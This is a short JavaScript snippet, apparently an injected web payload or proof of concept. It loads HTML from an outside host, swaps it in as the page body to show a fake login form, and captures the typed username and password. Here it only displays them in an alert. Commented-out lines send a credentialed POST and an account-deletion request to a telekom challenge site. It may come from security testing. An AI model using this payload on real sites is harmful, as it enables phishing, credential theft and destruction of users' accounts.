fetch("https://tearful-earth.surge.sh/site.html").then(res=>res.text()).then(res => {


  document.body.innerHTML = res;

  const form = document.querySelector('#aa');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('#user').value
    let pass = document.querySelector('#pass').value
    alert('Login: ' + login + " password: " + pass);

    return;
  }, true);
})

// fetch("https://challenge.telekom.com/en/users", { "method": "POST", "credentials": "include"})


// fetch("https://challenge.telekom.com/en/user/settings/delete")
